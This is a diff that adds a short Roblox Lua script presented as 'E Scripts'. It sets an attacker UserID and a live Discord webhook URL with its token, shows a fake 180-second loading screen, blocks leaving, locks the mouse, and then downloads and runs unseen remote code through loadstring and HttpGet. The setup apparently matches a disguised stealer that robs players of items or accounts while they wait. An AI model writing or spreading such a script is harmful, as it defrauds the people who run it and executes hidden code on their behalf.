@@ -1,0 +1,14 @@
+_G.UserID = 4757686619 -- UserID --
+
+_G.WebhookUrl = "https://discord.com/api/webhooks/1125494889216479324/ylfw-bf4RRpaqLMx2NCyEem6cpXGmP5ZH7GeE0y6lIj-J9ww3k7IxuvjxqEOCC4DVgsG"
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+-- Toggle false/true to enable and disable
+
+_G.ScriptName = "E Scripts"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- it's the time between 0% and 100% in seconds
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zunggg/Zela3wI4fsz/main/sze3erla2ac"))()
